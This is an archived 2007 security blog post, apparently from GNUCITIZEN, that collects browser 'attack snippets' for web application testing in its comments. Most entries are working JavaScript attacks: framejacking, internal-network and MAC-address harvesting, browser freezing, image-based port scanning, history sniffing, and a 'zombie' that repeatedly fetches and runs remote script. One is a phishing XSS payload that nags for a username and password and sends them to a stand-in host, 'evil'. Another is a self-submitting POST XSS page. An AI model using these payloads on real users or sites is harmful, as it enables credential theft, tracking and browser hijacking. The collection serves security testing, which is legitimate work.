<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Atom Database</title><meta name="description" content="&gt; Atom is The smallest part of a substance which can exist and still retain the properties of the substance. All familiar matter consists of atoms. An atom consists of a positively charged nucleus and orbiting electrons. The simplest atom is hydrogen (one proton and one electron), and the largest atom in nature is uranium (92 protons, 92 electrons, and 146 neutrons). KU"><meta property="name" content="Atom Database"><meta itemprop="name" content="Atom Database"><meta property="description" content="&gt; Atom is The smallest part of a substance which can exist and still retain the properties of the substance. All familiar matter consists of atoms. An atom consists of a positively charged nucleus and orbiting electrons. The simplest atom is hydrogen (one proton and one electron), and the largest atom in nature is uranium (92 protons, 92 electrons, and 146 neutrons). KU"><meta itemprop="description" content="&gt; Atom is The smallest part of a substance which can exist and still retain the properties of the substance. All familiar matter consists of atoms. An atom consists of a positively charged nucleus and orbiting electrons. The simplest atom is hydrogen (one proton and one electron), and the largest atom in nature is uranium (92 protons, 92 electrons, and 146 neutrons). KU"><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fatom-2%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fatom-2%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/atom-2/"><meta property="og:title" content="Atom Database"><meta property="og:description" content="&gt; Atom is The smallest part of a substance which can exist and still retain the properties of the substance. All familiar matter consists of atoms. An atom consists of a positively charged nucleus and orbiting electrons. The simplest atom is hydrogen (one proton and one electron), and the largest atom in nature is uranium (92 protons, 92 electrons, and 146 neutrons). KU"><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fatom-2%2F?w=1024"><meta name="twitter:title" content="Atom Database"><meta name="twitter:description" content="&gt; Atom is The smallest part of a substance which can exist and still retain the properties of the substance. All familiar matter consists of atoms. An atom consists of a positively charged nucleus and orbiting electrons. The simplest atom is hydrogen (one proton and one electron), and the largest atom in nature is uranium (92 protons, 92 electrons, and 146 neutrons). KU"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fatom-2%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/blog/">Blog</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Atom Database</h1><div class="date">Sat, 20 Jan 2007 10:12:19 GMT</div><div class="author">by pdp</div><div id="post-content"><blockquote>
<p>Atom is The smallest part of a substance which can exist and still retain the properties of the substance. All familiar matter consists of atoms. An atom consists of a positively charged nucleus and orbiting electrons. The simplest atom is hydrogen (one proton and one electron), and the largest atom in nature is uranium (92 protons, 92 electrons, and 146 neutrons). <a href="http://www.google.co.uk/url?sa=X&amp;start=18&amp;oi=define&amp;q=http://www.ku.edu/~kuspace/outreach/glossary.html&amp;usg=__zJmR9Ce-yDypbtHxa_ZB0nHl5jI=">KU</a></p>
</blockquote>
<p>The purpose of this project is to collect useful attack snippets, which can be employed when performing WEB Application Security testing.</p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>Framejack</h3>

<p>Hijack the current user browser window. This technique employs a single 100%x100% frame that sits on the top of the currently exploited remote content. When the user interacts with the browser window or tab the attacker persists state. This state is lost as soon as the user moves to another URL.</p>

<pre><code>function framejack(url) {
	var ifr = document.createElement('iframe');
	ifr.src= url;

	document.body.scroll = 'no';
	document.body.appendChild(ifr);

	ifr.style.position = 'absolute';
	ifr.style.width = ifr.style.height = '100%';
	ifr.style.top = ifr.style.left = ifr.style.border = 0;
}</code></pre>

<p>All Browsers, JavaScript, hijack, frame, persistency</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>getNetInfo</h3>

<p>Retrieve network information. By using this function attackers can retrieve information about the local NATed IP address and host name. This information is highly sensitive since it enables attackers to conduct attacks on Intranet resources.</p>

<pre><code>function getNetInfo() {
	var sock = new java.net.Socket();
	sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
	sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port));
	return {domain: sock.getLocalAddress().getHostName(), ip: sock.getLocalAddress().getHostAddress()};	
}</code></pre>

<p>Firefox, Opera, Live Connect, JavaScript, Information Gathering</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>Freeze</h3>

<p>Freeze the browser for defined time. The time is in milliseconds. While frozen, users are unable to interact with the browser. Certain browsers may terminate the script if the time value is too high. Attackers can use this function to force the browser to wait until certain remote event occurs.</p>

<pre><code>function freeze(time) {
	var date = new Date();
	var cur = null;
	
	do {
		cur = new Date();
	} while(cur - date &lt; time);
}</code></pre>

<p>All Browsers, JavaScript, freeze, DoS</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>googleAjaxSearch</h3>

<p>Perform searches with Google from the browser. This technique can be employed by attackers in order to make self-propagating Ajax worms. The worms finds new targets via Google and uses your browser to attack.</p>

<pre><code>function googleAjaxSearch(callback, query, key, context) {
	if (googleAjaxSearch.callbacks == undefined)
		googleAjaxSearch.callbacks = new Array();

	var key = (key == undefined)?'internal-documentation':key;
	var context = (context == undefined)?0:context;

	var script = document.createElement('script');
	script.defer = true;
	script.type = 'text/javascript';
	script.src = 'http://www.google.com/uds/GwebSearch?callback=googleAjaxSearch.callbacks.callback' + googleAjaxSearch.callbacks.length + '&context=' + context + '&lstkp=0&rsz=large&hl=en&q=' + query + '&key=' + key + '&v=0.1';
	
	googleAjaxSearch.callbacks['callback' + googleAjaxSearch.callbacks.length] = function (context, results, status) {
		document.body.removeChild(script);
		delete googleAjaxSearch.callbacks['callback' + googleAjaxSearch.callbacks.length];
		callback(results, query, key, context, status);
	};
	
	document.body.appendChild(script);
}</code></pre>

<p>All Browsers, JavaScript, Google, search</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>portScan</h3>

<p>Perform port scanning. This not the only way attackers can perform port scanning. You need to adjust the timeout value in order to achieve the most desired result. This technique can be quite inaccurate sometimes.</p>

<pre><code>function portScan(callback, target, ports, timeout) {
	var timeout = (timeout == null)?100:timeout;

	for (index = 0; index &lt; ports.length; index++)
 		new function () {
			var img = new Image();
			img.onload = img.onerror = function () {
				if (!img) return;
				img = undefined;
				callback(target, ports[index], true);
			};
			img.src = 'http://' + target + ':' + ports[index];

			window.setTimeout(function () {
				if (!img) return;
				img = undefined;
				callback(target, ports[index], false);
			}, timeout);
		};
}</code></pre>

<p>All Browsers, JavaScript, portscan</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>getURLJ</h3>

<p>Retrieve remote content by using Java Live Connect. This function is very suitable when a binary files is required to be downloaded. Works only on Live Connect browsers.</p>

<pre><code>function getURLJ(url) {
	var data = null;
	var destination = new java.net.URL(url);
	var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 65536);
	var stream = destination.getContent();
	
	while (true) {
		var count = stream.read(buffer);
		
		if (count &lt;= 0)
			break;
			
		var str = new java.lang.String(buffer, 0, count);
		data += str;
	}
	
	stream.close();
	return data;
}</code></pre>

<p>Firefox, Opera, Live Connect, JavaScript</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>zombie</h3>

<p>Attach a zombie. This function will perform queries to "<strong>url</strong>" on a regular basis (specified by interval). Retrieved data is evaluated as a JavaScript expressions.</p>

<pre><code>function zombie(url, interval) {
	var interval = (interval == null)?2000:interval;

	setInterval(function () {
		var script = document.createElement('script');
		script.defer = true;
		script.type = 'text/javascript';
		script.src = url;
		document.body.appendChild(script);
	}, interval);
}</code></pre>

<p>All Browsers, JavaScript, zombie</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>getDocument</h3>

<p>Retrieve the document object in a cross-browser manner. This function is very useful when the attacker want to read the content of a particular iframe or frame.</p>

<pre><code>function getDocument(target) {
	if (target == undefined)
		return document;
	else if (target.contentDocument)
		return target.contentDocument;
	else if (target.contentWindow)
		return target.contentWindow.document;
	else if (target.document)
		return target.document;
	else
		throw 'unable to get document object';
}</code></pre>

<p>All Browsers, JavaScript, document, iframe</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>historyScan</h3>

<p>Scan user history. This function enumerates the current user visited links by performing checks on their style.</p>

<pre><code>function getDocument(target) {
	if (target == undefined)
		return document;
	else if (target.contentDocument)
		return target.contentDocument;
	else if (target.contentWindow)
		return target.contentWindow.document;
	else if (target.document)
		return target.document;
	else
		throw 'unable to get document object';
}

function historyScan(callback, URLs) {
	var iframe = document.createElement('iframe');
	iframe.style.visibility = 'hidden';
	document.body.appendChild(iframe);
	
	var doc = getDocument(iframe);
	doc.open();
	doc.write('&lt;style&gt;a:visited{display: none}&lt;/style&gt;');
	doc.close();
	
	for (index = 0; index &lt; URLs.length; index++) {
		var a = doc.createElement('a');
		a.href = URLs[index];
		doc.body.appendChild(a);
		
		if (a.currentStyle)
			var display = a.currentStyle['display'];
		else
			var display = doc.defaultView.getComputedStyle(a, null).getPropertyValue('display')
			
		callback(URLs[index], display == 'none'?true:false);
	}
	
	document.body.removeChild(iframe);
}</code></pre>

<p>All Browsers, JavaScript, history, scan</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>b64encode</h3>

<p>This function encodes a string in base64 format.</p>

<pre><code>function b64encode(input) {
	var b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

	var result = '';
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;
	
	do {
		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);
		
		enc1 = chr1 &gt;&gt; 2;
		enc2 = ((chr1 & 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);
		enc3 = ((chr2 & 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);
		enc4 = chr3 & 63;
		
		if (isNaN(chr2)) {
			enc3 = enc4 = 64;
		} else if (isNaN(chr3)) {
			enc4 = 64;
		}
		
		result += b64chars.charAt(enc1) + b64chars.charAt(enc2) + b64chars.charAt(enc3) + b64chars.charAt(enc4);
	} while (i &lt; input.length);
	
	return result;
}</code></pre>

<p>JavaScript, Cross-platformed, base64, Encodings</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>b64decode</h3>

<p>This function decodes base64 strings.</p>

<pre><code>function b64decode(input) {
	var b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';

	var result = '';
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	var input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

	do {
		enc1 = b64chars.indexOf(input.charAt(i++));
		enc2 = b64chars.indexOf(input.charAt(i++));
		enc3 = b64chars.indexOf(input.charAt(i++));
		enc4 = b64chars.indexOf(input.charAt(i++));

		chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);
		chr2 = ((enc2 & 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);
		chr3 = ((enc3 & 3) &lt;&lt; 6) | enc4;

		result += String.fromCharCode(chr1);

		if (enc3 != 64)
			result += String.fromCharCode(chr2);

		if (enc4 != 64)
			result += String.fromCharCode(chr3);
	} while (i &lt; input.length);
	
	return result;
}</code></pre>

<p>JavaScript, Cross-platformed, base64, Encodings</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/2f6303f9095f59c14c3097ef4df566f5?s=256&amp;d=retro" alt="kuza55"><span class="post-comment-author">kuza55</span><div class="post-comment-content"><h3>Firefox B64 Functions</h3>

<p>These functions are part of the javascript window object in the Gecko engine.</p>

<pre><code>alert (btoa("test"));
alert (atob("dGVzdA=="));</code></pre>

<p>JavaScript, Firefox, base64, Encodings</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>include</h3>

<p>Load a remote script file. This function is non-blocking which means that you have to wait for the script to load before using its declarations.</p>

<pre><code>function include(url) {
	document.write('&lt;' + 'script src="' + url + '" language="javascript" type="text/javascript"' + '&gt;' + '&lt;' + '/script' + '&gt;');
}</code></pre>

<p>JavaScript, All Browsers, include, modules</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>include</h3>

<p>Load a remote script file. This function is non-blocking which means that you have to wait for the script to load before using its declarations. For that reason you may want to use the <strong>onload</strong> callback function.</p>

<pre><code>function include(url, onload) {
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.onload = onload;
	script.src = url;
	document.body.appendChild(script);
}</code></pre>

<p>Mozilla, Firefox, Opera, include, modules</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>forcefocus</h3>

<p>This function can be used to force the focus on a particular element from the current dom.</p>

<pre><code>function forcefocus(target, timeout) {
	var timeout = (timeout == undefined) ? 500 : timeout;

	target.focus();

	setTimeout(function () {
		forcefocus(target);
	}, timeout);
}</code></pre>

<p>All Browsers, focus</p></div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>walkJSON</h3>

This function walk the entire JSON (the <strong>j</strong> parameter) tree. The <strong>c</strong> parameter is the function that handles walked nodes.

<pre><code>function walkJSON(j, c) {
    if (typeof(c) != 'function') {
        return;
    }

    for (var i in j) {
        c(i, j[i]);

        if (j[i] instanceof Array || typeof(j[i]) == 'object') {
            arguments.callee(j[i], c);
        }
    }
}</code></pre>

universal</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content"><h3>parseURL</h3>

This function parse the URL into an object.

<pre><code>function parseURL(url) {
	var REGEX = /^((\w+):\/\/)?((\w+):?(\w+)?@)?([^\/\?:]+):?(\d+)?(\/?[^\?#]+)?\??([^#]+)?#?(\w*)/;
	
	var fields = {'href': 0, 'username' : 4, 'password' : 5, 'port' : 7, 'protocol' : 2, 'host' : 6, 'hostname' : 6, 'pathname' : 8, 'search' : 9, 'hash' : 10};
	var result = new Object();
	var r = REGEX.exec(url);
	
	for (var field in fields) {
		result[field] = r[fields[field]];
	}
	
	result.hash = result.hash?'#' + result.hash:'#';
	result.search = result.search?'?' + result.search:'?';
	result.username = result.username?result.username:'';
	result.password = result.password?result.password:'';
	
	if (result.port == undefined) {
		switch (result.protocol) {
			case 'http':
				result.port = 80;
				break;
			case 'https':
				result.port = 443;
				break;
			case 'ftp':
				result.port = 21;
				break;
			default:
				result.port = '';
				break;
		}
	}
	
	return result;
}</code></pre>

universal</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content"><h3>STICKY PHISHING</h3>

This payload launches a phishing attack to the user.  It's sticky cuz it won't stop prompting the victim to enter his username and password until he enters both. Once obtained they are forwarded to a third-party site. Ideal for persistent XSS attacks.

<pre><code>do{a=prompt(&quot;APP_OR_SITE_NAME: an error has ocurred\nPlease enter your USERNAME&quot;,&quot;&quot;);b=prompt(&quot;APP_OR_SITE_NAME: an error has ocurred\nPlease enter your PASSWORD&quot;,&quot;&quot;);} while(a==null || b==null || a==&quot;&quot; || b==&quot;&quot;);alert(&quot;owned!:&quot;+a+&quot;/&quot;+b);window.location=&quot;http://evil/?u=&quot;+a+&quot;&amp;p=&quot;+b</code></pre>

JavaScript, Universal, Password Theft</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content"><h3>POST METHOD XSS</h3>

Attack HTML page for XSS vuls that can only be exploited as a POST request (as opposed to GET)

<pre><code>&lt;html&gt;
&lt;!-- this page would be hosted on the attacker&apos;s site and the victim would need to be tricked into visiting it --&gt;
&lt;form method=&quot;post&quot; action=&quot;http://target/vulnerable.jsp&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;param&quot; value=&apos;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&apos;&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
&lt;/html&gt;</code></pre>

Universal, HTML, JavaScript</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/13deb608031da5a7c045c444c97b907e?s=256&amp;d=retro" alt="yUnwEb"><span class="post-comment-author">yUnwEb</span><div class="post-comment-content"><h3>MAC ADDRESS</h3>

You can steal the user's MAC address with Java 1.6. For Internet Explorer you can use an applet. This information is very sensitive, because the MAC address is a unique identifier. Although it can be easily changed by the user, it can be useful to identify some users with dynamic IP address or using proxies.

<pre><code>function get_mac() {
    try {
        var ifaces = java.net.NetworkInterface.getNetworkInterfaces()
        var ifaces_list = java.util.Collections.list(ifaces);
        for (var i = 0; i &lt; ifaces_list.size(); i++) {
            var mac = ifaces_list.get(i).getHardwareAddress();
            if (mac) {
                return mac;
            }
        }
    } catch (e) { }
    return false;
}</code></pre>

Firefox, Opera, Live Connect, Java SE 6, JavaScript, Information Gathering</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2022 <a href=""></a>. All rights reserved.</p></footer></body></html>